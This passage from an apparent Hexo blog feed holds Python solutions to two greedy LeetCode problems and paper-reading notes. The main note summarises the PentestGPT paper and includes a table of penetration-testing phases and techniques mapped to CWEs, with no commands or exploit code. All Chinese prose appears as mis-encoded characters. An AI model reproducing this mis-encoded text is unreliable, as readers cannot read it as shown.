çš„æœ€å¤§æ•°å­—ï¼Œä¸”æ•°å­—å‘ˆ å•è°ƒé€’å¢ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: n = 10</span><br><span class="line">è¾“å‡º: 9</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä»å³å‘å·¦éå†ï¼Ÿ<br>è´ªå¿ƒç­–ç•¥ï¼šå¦‚æœ strNum[i-1] &gt; strNum[i]ï¼Œä¸€å®šè¦è®© strNum[i-1] å˜å°ï¼Œå¹¶æŠŠ flag ä½ç½®ä¹‹åçš„æ‰€æœ‰æ•°å­—å˜ 9ï¼Œæ‰èƒ½ä¿è¯æœ€å¤§çš„å•è°ƒé€’å¢æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">monotoneIncreasingDigits</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># å°†æ•´æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">        strNum = <span class="built_in">str</span>(n)</span><br><span class="line">        <span class="comment"># flagç”¨æ¥æ ‡è®°èµ‹å€¼9ä»å“ªé‡Œå¼€å§‹</span></span><br><span class="line">        <span class="comment"># è®¾ç½®ä¸ºå­—ç¬¦ä¸²é•¿åº¦ï¼Œä¸ºäº†é˜²æ­¢ç¬¬äºŒä¸ªforå¾ªç¯åœ¨flagæ²¡æœ‰è¢«èµ‹å€¼çš„æƒ…å†µä¸‹æ‰§è¡Œ</span></span><br><span class="line">        flag = <span class="built_in">len</span>(strNum)</span><br><span class="line">        <span class="comment"># ä»å³å¾€å·¦éå†å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(strNum)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="comment"># å¦‚æœå½“å‰å­—ç¬¦æ¯”å‰ä¸€ä¸ªå­—ç¬¦å°ï¼Œè¯´æ˜éœ€è¦ä¿®æ”¹å‰ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">            <span class="keyword">if</span> strNum[i-<span class="number">1</span>] &gt; strNum[i]:</span><br><span class="line">                flag = i <span class="comment"># æ›´æ–°flagçš„å€¼ï¼Œè®°å½•éœ€è¦ä¿®æ”¹çš„ä½ç½®</span></span><br><span class="line">                strNum = strNum[:i-<span class="number">1</span>] + <span class="built_in">str</span>(<span class="built_in">int</span>(strNum[i-<span class="number">1</span>]) - <span class="number">1</span>) + strNum[i:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag, <span class="built_in">len</span>(strNum)):</span><br><span class="line">            strNum = strNum[:i] + <span class="string">&#x27;9&#x27;</span> + strNum[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(strNum)</span><br></pre></td></tr></table></figure><h2 id="968-ç›‘æ§äºŒå‰æ ‘-é‡è¦ï¼"><a href="#968-ç›‘æ§äºŒå‰æ ‘-é‡è¦ï¼" class="headerlink" title="968. ç›‘æ§äºŒå‰æ ‘ é‡è¦ï¼"></a>968. ç›‘æ§äºŒå‰æ ‘ é‡è¦ï¼</h2><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæˆ‘ä»¬åœ¨æ ‘çš„èŠ‚ç‚¹ä¸Šå®‰è£…æ‘„åƒå¤´ã€‚<br>èŠ‚ç‚¹ä¸Šçš„æ¯ä¸ªæ‘„å½±å¤´éƒ½å¯ä»¥ç›‘è§†å…¶çˆ¶å¯¹è±¡ã€è‡ªèº«åŠå…¶ç›´æ¥å­å¯¹è±¡ã€‚<br>è®¡ç®—ç›‘æ§æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹æ‰€éœ€çš„æœ€å°æ‘„åƒå¤´æ•°é‡ã€‚</p><p>ä»é¢˜ç›®ä¸­ç¤ºä¾‹ï¼Œå…¶å®å¯ä»¥å¾—åˆ°å¯å‘ï¼Œæˆ‘ä»¬å‘ç°é¢˜ç›®ç¤ºä¾‹ä¸­çš„æ‘„åƒå¤´éƒ½æ²¡æœ‰æ”¾åœ¨å¶å­èŠ‚ç‚¹ä¸Šï¼<br>è¿™æ˜¯å¾ˆé‡è¦çš„ä¸€ä¸ªçº¿ç´¢ï¼Œæ‘„åƒå¤´å¯ä»¥è¦†ç›–ä¸Šä¸­ä¸‹ä¸‰å±‚ï¼Œå¦‚æœæŠŠæ‘„åƒå¤´æ”¾åœ¨å¶å­èŠ‚ç‚¹ä¸Šï¼Œå°±æµªè´¹çš„ä¸€å±‚çš„è¦†ç›–ã€‚<br>æ‰€ä»¥æŠŠæ‘„åƒå¤´æ”¾åœ¨å¶å­èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä½ç½®ï¼Œæ‰èƒ½å……åˆ†åˆ©ç”¨æ‘„åƒå¤´çš„è¦†ç›–é¢ç§¯ã€‚<br>é‚£ä¹ˆæœ‰åŒå­¦å¯èƒ½é—®äº†ï¼Œä¸ºä»€ä¹ˆä¸ä»å¤´ç»“ç‚¹å¼€å§‹çœ‹èµ·å‘¢ï¼Œä¸ºå•¥è¦ä»å¶å­èŠ‚ç‚¹çœ‹å‘¢ï¼Ÿ<br>å› ä¸ºå¤´ç»“ç‚¹æ”¾ä¸æ”¾æ‘„åƒå¤´ä¹Ÿå°±çœä¸‹ä¸€ä¸ªæ‘„åƒå¤´ï¼Œ å¶å­èŠ‚ç‚¹æ”¾ä¸æ”¾æ‘„åƒå¤´çœä¸‹äº†çš„æ‘„åƒå¤´æ•°é‡æ˜¯æŒ‡æ•°é˜¶åˆ«çš„ã€‚<br>æ‰€ä»¥æˆ‘ä»¬è¦ä»ä¸‹å¾€ä¸Šçœ‹ï¼Œå±€éƒ¨æœ€ä¼˜ï¼šè®©å¶å­èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹å®‰æ‘„åƒå¤´ï¼Œæ‰€ç”¨æ‘„åƒå¤´æœ€å°‘ï¼Œæ•´ä½“æœ€ä¼˜ï¼šå…¨éƒ¨æ‘„åƒå¤´æ•°é‡æ‰€ç”¨æœ€å°‘ï¼</p><p>åœ¨äºŒå‰æ ‘ä¸­å¦‚ä½•ä»ä½å‘ä¸Šæ¨å¯¼å‘¢ï¼Ÿ<br>å¯ä»¥ä½¿ç”¨ååºéå†ä¹Ÿå°±æ˜¯å·¦å³ä¸­çš„é¡ºåºï¼Œè¿™æ ·å°±å¯ä»¥åœ¨å›æº¯çš„è¿‡ç¨‹ä¸­ä»ä¸‹åˆ°ä¸Šè¿›è¡Œæ¨å¯¼äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># Greedy Algo:</span></span><br><span class="line">        <span class="comment"># ä»ä¸‹å¾€ä¸Šå®‰è£…æ‘„åƒå¤´ï¼šè·³è¿‡leavesè¿™æ ·å®‰è£…æ•°é‡æœ€å°‘ï¼Œå±€éƒ¨æœ€ä¼˜ -&gt; å…¨å±€æœ€ä¼˜</span></span><br><span class="line">        <span class="comment"># å…ˆç»™leavesçš„çˆ¶èŠ‚ç‚¹å®‰è£…ï¼Œç„¶åæ¯éš”ä¸¤å±‚èŠ‚ç‚¹å®‰è£…ä¸€ä¸ªæ‘„åƒå¤´ï¼Œç›´åˆ°Head</span></span><br><span class="line">        <span class="comment"># 0: è¯¥èŠ‚ç‚¹æœªè¦†ç›–</span></span><br><span class="line">        <span class="comment"># 1: è¯¥èŠ‚ç‚¹æœ‰æ‘„åƒå¤´</span></span><br><span class="line">        <span class="comment"># 2: è¯¥èŠ‚ç‚¹æœ‰è¦†ç›–</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minCameraCover</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># å®šä¹‰é€’å½’å‡½æ•°</span></span><br><span class="line">        result = [<span class="number">0</span>] <span class="comment"># è®°å½•æ‘„åƒå¤´æ•°é‡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.traversal(root, result) == <span class="number">0</span>:</span><br><span class="line">            result[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">traversal</span>(<span class="params">self, cur: TreeNode, result: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cur:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        left = <span class="variable language_">self</span>.traversal(cur.left, result)</span><br><span class="line">        right = <span class="variable language_">self</span>.traversal(cur.right, result)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">2</span> <span class="keyword">and</span> right == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">0</span> <span class="keyword">or</span> right == <span class="number">0</span>:</span><br><span class="line">            result[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">1</span> <span class="keyword">or</span> right == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è´ªå¿ƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è®ºæ–‡ç²¾è¯»ã€‘Vulnerability-oriented Testing for RESTful APIs</title>
      <link href="/2025/03/11/PaperReading/restfulapi/"/>
      <url>/2025/03/11/PaperReading/restfulapi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®ºæ–‡ç²¾è¯» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è®ºæ–‡ç²¾åº¦ã€‘SafeDrive Knowledge- and Data-Driven Risk-Sensitive Decision-Making for Autonomous Vehicles with Large Language Models</title>
      <link href="/2025/03/04/PaperReading/SafeDrive/"/>
      <url>/2025/03/04/PaperReading/SafeDrive/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®ºæ–‡ç²¾è¯» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attackqa</title>
      <link href="/2025/03/03/PaperReading/attackqa/"/>
      <url>/2025/03/03/PaperReading/attackqa/</url>
      
        <content type="html"><![CDATA[<p>todo: AttackQA: Development and Adoption of a Dataset for Assisting Cybersecurity Operations Using Fine-Tuned and Open-Source LLMs<br>todoï¼šHelping LLMs Improve Code Generation Using Feedback from Testing and Static Analysis</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€è®ºæ–‡ç²¾è¯»ã€‘PENTESTGPT Evaluating and Harnessing Large Language Models for Automated Penetration Testing</title>
      <link href="/2025/01/20/PaperReading/pentestgpt/"/>
      <url>/2025/01/20/PaperReading/pentestgpt/</url>
      
        <content type="html"><![CDATA[<h2 id="todo-è¿™ç¯‡æ–‡ç« ä¹Ÿå¯ä»¥çœ‹ä¸‹"><a href="#todo-è¿™ç¯‡æ–‡ç« ä¹Ÿå¯ä»¥çœ‹ä¸‹" class="headerlink" title="todo è¿™ç¯‡æ–‡ç« ä¹Ÿå¯ä»¥çœ‹ä¸‹"></a>todo è¿™ç¯‡æ–‡ç« ä¹Ÿå¯ä»¥çœ‹ä¸‹</h2><p><a href="https://www.secrss.com/articles/76018">https://www.secrss.com/articles/76018</a></p><p><a href="https://www.secrss.com/articles/59179">https://www.secrss.com/articles/59179</a><br>é¡¹ç›®å¼€æºåœ°å€:<a href="https://github.com/GreyDGL/PentestGPT/">https://github.com/GreyDGL/PentestGPT/</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>è®ºæ–‡ä¸»è¦ä»‹ç»äº†ä¸€ä¸ªåŸºäºå¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•å·¥å…·PENTESTGPTä»¥åŠå®ƒçš„è®¾è®¡å’Œå®ç°è¿‡ç¨‹ã€‚ä½œè€…é€šè¿‡å¯¹GPT-3.5ã€GPT-4å’ŒBardä¸‰ç§LLMçš„è¯„ä¼°ï¼Œå‘ç°å®ƒä»¬å…·æœ‰ä¸€å®šçš„æ¸—é€æµ‹è¯•èƒ½åŠ›ï¼Œä½†éš¾ä»¥ä¿æŒé•¿æœŸè®°å¿†å’Œè§£å†³å¤æ‚é—®é¢˜ã€‚ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œä½œè€…è®¾è®¡äº†ä¸‰ä¸ªè‡ªäº¤äº’çš„æ¨¡å—ï¼Œåˆ†åˆ«è§£å†³æ¸—é€æµ‹è¯•çš„ä¸åŒå­ä»»åŠ¡ï¼Œå¹¶æå‡ºäº†ä¸€äº›æœ‰æ•ˆçš„æç¤ºå’Œç­–ç•¥ã€‚è¯„ä¼°æ˜¾ç¤ºï¼ŒPENTESTGPTæ¯”åŸå§‹LLMçš„ä»»åŠ¡å®Œæˆç‡æé«˜äº†228.6%ï¼Œå¹¶ä¸”åœ¨å®é™…åº”ç”¨ä¸­ä¹Ÿå–å¾—äº†è‰¯å¥½çš„æ•ˆæœã€‚</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This study, guided by the principle â€œthe best defense is a good offenseâ€, focuses on offensive strategies, specifically penetration testing.<br>Consequently, an imperative question presents: To what extend can LLMs automate penetration testing?</p><p>æµ‹è¯•åŸºå‡†: To address this limitation, we construct a robust benchmark that includes test machines from HackTheBox and VulnHub â€”two leading platforms for penetration tesing challenges. Comprising 13 targets with 182 sub-tasks, our benchmark encompasses all vulnerabilities appearing in OWASPâ€™s top 10 vulnerability list and 18 Common Weakness Enumeration (CWE) items <a href="https://blog.csdn.net/u013129300/article/details/128487328">CWEä»‹ç»</a>.</p><p>å¤§è¯­è¨€æ¨¡å‹æ¸—é€æµ‹è¯•æ—¶å­˜åœ¨çš„ä¸»è¦ä¼˜ç¼ºç‚¹: å¤§å‹è¯­è¨€æ¨¡å‹ç‰¹åˆ«æ“…é•¿ä½¿ç”¨æµ‹è¯•å·¥å…·æ‰§è¡Œå¤æ‚çš„å‘½ä»¤å’Œé€‰é¡¹ï¼Œè€ŒåƒGPT-4è¿™æ ·çš„æ¨¡å‹åœ¨ç†è§£æºä»£ç å’Œç¡®å®šæ¼æ´æ–¹é¢è¡¨ç°å‡ºè‰²ã€‚æ­¤å¤–ï¼Œå¤§å‹è¯­è¨€æ¨¡å‹å¯ä»¥åˆ¶ä½œé€‚å½“çš„æµ‹è¯•å‘½ä»¤ï¼Œå¹¶å‡†ç¡®åœ°æè¿°ç‰¹å®šä»»åŠ¡æ‰€éœ€çš„å›¾å½¢ç”¨æˆ·ç•Œé¢æ“ä½œã€‚åˆ©ç”¨ä»–ä»¬åºå¤§çš„çŸ¥è¯†åº“ï¼Œä»–ä»¬å¯ä»¥è®¾è®¡å‡ºåˆ›é€ æ€§çš„æµ‹è¯•ç¨‹åºï¼Œä»¥æ­ç¤ºç°å®ä¸–ç•Œç³»ç»Ÿå’ŒCTFæŒ‘æˆ˜ä¸­çš„æ½œåœ¨æ¼æ´ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ°å¤§å‹è¯­è¨€æ¨¡å‹åœ¨ä¿æŒå¯¹æ€»ä½“æµ‹è¯•åœºæ™¯çš„è¿è´¯æŠŠæ¡æ–¹é¢æœ‰å›°éš¾ï¼Œè¿™æ˜¯å®ç°æµ‹è¯•ç›®æ ‡çš„ä¸€ä¸ªé‡è¦æ–¹é¢ã€‚éšç€å¯¹è¯çš„è¿›è¡Œï¼Œä»–ä»¬å¯èƒ½ä¼šå¿½ç•¥å…ˆå‰çš„å‘ç°ï¼Œå¹¶åŠªåŠ›å°†ä»–ä»¬çš„æ¨ç†å§‹ç»ˆä¸€è‡´åœ°åº”ç”¨äºæœ€ç»ˆç›®æ ‡ã€‚æ­¤å¤–ï¼Œå¤§å‹è¯­è¨€æ¨¡å‹è¿‡åˆ†å¼ºè°ƒå¯¹è¯å†å²ä¸­æœ€è¿‘çš„ä»»åŠ¡ï¼Œè€Œä¸ç®¡å®ƒä»¬çš„æ¼æ´çŠ¶æ€ã€‚å› æ­¤ï¼Œä»–ä»¬å¾€å¾€ä¼šå¿½ç•¥ä¹‹å‰æµ‹è¯•ä¸­æš´éœ²çš„å…¶ä»–æ½œåœ¨æ”»å‡»é¢ï¼Œä»è€Œæ— æ³•å®Œæˆæ¸—é€æµ‹è¯•ä»»åŠ¡ã€‚</p><p>PentestGPT ä¸»è¦åŒ…æ‹¬ä¸‰ä¸ªæ¨¡å—: Reasoning, Generation, and Parsing Modules. The Reasoning Module emulates the function of a lead tester, focusing on maintaining a high-level overview of the penetration testing status. We introduce a novel representation, the Pentesting Task Tree (PTT), based on the cybersecurity attack tree <a href="https://satoss.uni.lu/members/barbara/papers/adt.pdf">æ”»å‡»æ ‘ä»‹ç»</a>. åˆ©ç”¨æ”»å‡»æ ‘å¯¹æµ‹è¯•è¿‡ç¨‹çŠ¶æ€è¿›è¡Œç¼–ç ,å¹¶æŒ‡å¯¼åç»­æ“ä½œ.The Generation Module,mirroring a junior testerâ€™s role, is responsible for constructing detailed procedures for specific sub-tasks. Translating these into exact testing operations augments the generation processâ€™s accuracy. Meanwhile, the Parsing Module deals with diverse text data encountered during penetration testing, such as tool outputs, source codes, and HTTP web pages. It condenses and emphasizes these texts, extracting essential information.</p><p><img src="/2025/01/20/PaperReading/pentestgpt/image.png" alt="MALISMæ¡†æ¶"><br>MALISSMæ˜¯ä½œè€…æå‡ºçš„ä¸€ä¸ªå®Œå…¨è‡ªåŠ¨åŒ–çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œå°†å…¶å‘½åä¸ºç½‘ç»œå®‰å…¨è®¤çŸ¥å¼•æ“ï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªæ¨¡å—ï¼š<br>EXPLOITFLOWï¼šé€šè¿‡æ•è·æ¯ä¸ªç¦»æ•£åŠ¨ä½œåçš„ç³»ç»ŸçŠ¶æ€æ¥ç”Ÿæˆå®‰å…¨å¼€å‘è·¯çº¿(åˆ©ç”¨æµ)ï¼›<br>PENTESTGPTï¼šåˆ©ç”¨LLMsä¸ºæ¯ä¸ªç»™å®šçš„ç¦»æ•£çŠ¶æ€å¯å‘å¼ç”Ÿæˆæµ‹è¯•æŒ‡å¯¼ï¼›<br>PENTESTPERFï¼šä¸€ä¸ªç»¼åˆæ¸—é€æµ‹è¯•åŸºå‡†ï¼Œç”¨äºè¯„ä¼°æ¸—é€æµ‹è¯•å™¨å’Œè‡ªåŠ¨åŒ–å·¥å…·åœ¨å¹¿æ³›çš„æµ‹è¯•ç›®æ ‡ä¸Šçš„æ€§èƒ½ã€‚</p><p>æ„Ÿè§‰è‡ªå·±ä¹‹å‰ä¹Ÿæœ‰è¿™ä¹ˆæƒ³è¿‡,å·¥ç¨‹é‡å¾ˆå¤§â€¦â€¦.</p><p>æ–‡ç« åˆ’åˆ†çš„å­ä»»åŠ¡åˆ—è¡¨:</p><table><thead><tr><th>Phase</th><th>Technique</th><th>Description</th><th>Related CWEs</th></tr></thead><tbody><tr><td><strong>Reconnaissance</strong></td><td>Port Scanning</td><td>Identify the open ports and related information on the target machine.</td><td>CWE-668</td></tr><tr><td></td><td>Web Enumeration</td><td>Gather detailed information about the targetâ€™s web applications.</td><td></td></tr><tr><td></td><td>FTP Enumeration</td><td>Identify potential vulnerabilities in FTP (File Transfer Protocol) services to gain unauthorized access or data extraction.</td><td></td></tr><tr><td></td><td>AD Enumeration</td><td>Identify potential vulnerabilities or mis-configurations in Active Directory Services.</td><td></td></tr><tr><td></td><td>Network Enumeration</td><td>Identify potential vulnerabilities within the network infrastructure to gain unauthorized access or disrupt services.</td><td></td></tr><tr><td></td><td>Other enumerations</td><td>Obtain information of other services, such as smb service, custom protocols, etc.</td><td></td></tr><tr><td><strong>Exploitation</strong></td><td>Command Injection</td><td>Inject arbitrary commands to be run on a host machine, often leading to unauthorized system control.</td><td>CWE-77, CWE-78</td></tr><tr><td></td><td>Cryptanalysis</td><td>Analyze the weak cryptographic methods or hash methods to obtain sensitive information.</td><td>CWE-310</td></tr><tr><td></td><td>Password Cracking</td><td>Crack Passwords using rainbow tables or cracking tools.</td><td>CWE-326</td></tr><tr><td></td><td>SQL Injection</td><td>Exploit SQL vulnerabilities, particularly SQL injection to manipulate databases and extract sensitive information.</td><td>CWE-78</td></tr><tr><td></td><td>XSS</td><td>Inject malicious scripts into web pages viewed by others, allowing for unauthorized access or data theft.</td><td>CWE-79</td></tr><tr><td></td><td>CSRF&#x2F;SSRF</td><td>Exploit cross-site request forgery or server-site request forgery vulnerabilities.</td><td>CWE-352, CWE-918</td></tr><tr><td></td><td>Known Vulnerabilities</td><td>Exploit services with known vulnerabilities, particularly CVEs.</td><td>CWE-1395</td></tr><tr><td></td><td>XXE</td><td>Exploit XML external entity vulnerabilities to achieve code execution.</td><td>CWE-611</td></tr><tr><td></td><td>Brute-Force</td><td>Leverage brute-force attacks to gain malicious access to target services.</td><td>CWE-799, CWE-770</td></tr><tr><td></td><td>Deserialization</td><td>Exploit insecure deserialization processes to execute arbitrary code or manipulate object data.</td><td>CWE-502</td></tr><tr><td></td><td>Other Exploitations</td><td>Other exploitations such as AD specific exploitation, prototype pollution, etc.</td><td></td></tr><tr><td><strong>Privilege Escalation</strong></td><td>File Analysis</td><td>Enumerate system&#x2F;service files to gain malicious information for privilege escalation.</td><td>CWE-200, CWE-538</td></tr><tr><td></td><td>System Configuration Analysis</td><td>Enumerate system&#x2F;service configurations to gain malicious information for privilege escalation.</td><td>CWE-15, CWE-16</td></tr><tr><td></td><td>Cronjob Analysis</td><td>Analyze and manipulate scheduled tasks (cron jobs) to execute unauthorized commands or disrupt normal operations.</td><td>CWE-250</td></tr><tr><td></td><td>User Access Exploitation</td><td>Exploit the improper settings of user access in combination with system properties to conduct privilege escalation.</td><td>CWE-284</td></tr><tr><td></td><td>Other techniques</td><td>Other general techniques, such as exploiting running processes with known vulnerabilities.</td><td></td></tr><tr><td><strong>General Techniques</strong></td><td>Code Analysis</td><td>Analyze source codes for potential vulnerabilities.</td><td></td></tr><tr><td></td><td>Shell Construction</td><td>Craft and utilize shell codes to manipulate the target system, often enabling control or extraction of data.</td><td></td></tr><tr><td></td><td>Social Engineering</td><td>A various range of techniques to gain information to target system, such as constructing custom password dictionary.</td><td></td></tr><tr><td></td><td>Others</td><td>Other techniques</td><td></td></tr></tbody></table><p>æ–‡ç« å¼€æºçš„githubåº“ç»™å‡ºçš„Prompt: <a href="https://github.com/GreyDGL/PentestGPT/blob/main/pentestgpt/prompts/prompt_class.py">https://github.com/GreyDGL/PentestGPT/blob/main/pentestgpt/prompts/prompt_class.py</a></p><h2 id="Exploratory-Study"><a href="#Exploratory-Study" class="headerlink" title="Exploratory Study"></a>Exploratory Study</h2><p>RQ1(Capability): LLMå¯ä»¥åœ¨å¤šå¤§ç¨‹åº¦ä¸Šæ‰§è¡Œæ¸—é€æµ‹è¯•ä»»åŠ¡ï¼Ÿ<br>RQ2(Comparative Analysis): äººç±»æ¸—é€æµ‹è¯•å‘˜å’ŒLLMçš„é—®é¢˜è§£å†³ç­–ç•¥æœ‰ä½•ä¸åŒï¼Ÿ</p><p>é’ˆå¯¹RQ1ï¼Œå‘ç°å¦‚ä¸‹ï¼š<br>Finding 1: LLMç†Ÿç»ƒæ‰§è¡Œç«¯åˆ°ç«¯æ¸—é€æµ‹è¯•ä»»åŠ¡ï¼Œä½†éš¾ä»¥åº”å¯¹æ›´å›°éš¾çš„ç›®æ ‡ï¼›<br>Finding 2: LLMså¯ä»¥æœ‰æ•ˆåœ°ä½¿ç”¨æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè¯†åˆ«å¸¸è§æ¼æ´ï¼Œå¹¶è§£é‡Šæºä»£ç ä»¥è¯†åˆ«æ¼æ´ã€‚</p><p>é’ˆå¯¹RQ2ï¼Œå‘ç°å¦‚ä¸‹ï¼š<br>Finding 3: LLMså¾ˆéš¾ç»´æŒé•¿æœŸè®°å¿†ï¼Œè€Œè¿™å¯¹æœ‰æ•ˆé“¾æ¥æ¼æ´å’Œåˆ¶å®šåˆ©ç”¨ç­–ç•¥è‡³å…³é‡è¦ï¼›<br>Finding 4: LLMså€¾å‘æœ€è¿‘çš„ä»»åŠ¡å’Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œè¿™ä¼šå¯¼è‡´è¿‡åº¦å…³æ³¨æŸä¸€ä»»åŠ¡å¹¶å¿˜è®°ä¹‹å‰çš„å‘ç°ï¼›<br>Finding 5: LLMså¯èƒ½ä¼šäº§ç”Ÿä¸å‡†ç¡®çš„æ“ä½œæˆ–å‘½ä»¤ã€‚</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p><img src="/2025/01/20/PaperReading/pentestgpt/image-1.png" alt="Overview"></p><h3 id="Reasoning-Module"><a href="#Reasoning-Module" class="headerlink" title="Reasoning Module"></a>Reasoning Module</h3><p>ä¼¼æ¸—é€æµ‹è¯•ä»»åŠ¡çš„å›¢é˜Ÿé¢†å¯¼ï¼Œä»ç”¨æˆ·é‚£é‡Œè·å–æµ‹è¯•ç»“æœæˆ–æ„å›¾ï¼Œå¹¶ä¸ºä¸‹ä¸€æ­¥å‡†å¤‡æµ‹è¯•ç­–ç•¥ã€‚è®ºæ–‡é’ˆå¯¹æ¸—é€æµ‹è¯•å¼•å…¥äº†ä¸€ç§æ–°çš„è¡¨ç¤ºPentesting Task Treeï¼ˆè§ä¸‹å›¾ï¼‰ï¼Œè¯¥ç»“æ„æŒç»­å¯¹æµ‹è¯•è¿‡ç¨‹çš„çŠ¶æ€è¿›è¡Œç¼–ç å¹¶å¼•å¯¼åç»­åŠ¨ä½œã€‚<br><img src="/2025/01/20/PaperReading/pentestgpt/image-2.png" alt="ä»»åŠ¡æ ‘"><br>æ–‡ç« è®¾è®¡äº†å››ç»„æç¤ºï¼Œä¾æ¬¡å¼•å¯¼æ¨ç†æ¨¡å—å®Œæˆæ¯ä¸ªé˜¶æ®µã€‚ä¸ºäº†å¢å¼ºç»“æœçš„å¯é‡å¤æ€§ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ç§ç§°ä¸º<a href="http://export.arxiv.org/abs/2307.07415">æç¤ºç”Ÿæˆ</a>çš„æŠ€æœ¯è¿›ä¸€æ­¥ä¼˜åŒ–äº†è¿™äº›æç¤ºã€‚</p><h3 id="Generation-Module"><a href="#Generation-Module" class="headerlink" title="Generation Module"></a>Generation Module</h3><p><img src="/2025/01/20/PaperReading/pentestgpt/image-4.png" alt="An Illustrative Example"><br>ç±»ä¼¼åˆçº§æµ‹è¯•äººå‘˜çš„è§’è‰²ï¼Œé‡‡ç”¨CoTç­–ç•¥å°†æ¨ç†æ¨¡å—ä¸­çš„ç‰¹å®šå­ä»»åŠ¡è½¬æ¢ä¸ºå…·ä½“çš„æ“ä½œå‘½ä»¤æˆ–æŒ‡ä»¤ï¼Œç¡®ä¿ç²¾ç¡®ä¸”å¯æ“ä½œçš„æ­¥éª¤æ¥æé«˜æµ‹è¯•è¿‡ç¨‹çš„å‡†ç¡®æ€§ã€‚<br><img src="/2025/01/20/PaperReading/pentestgpt/image-3.png" alt="PTTç¤ºä¾‹"></p><h3 id="Parsing-Module"><a 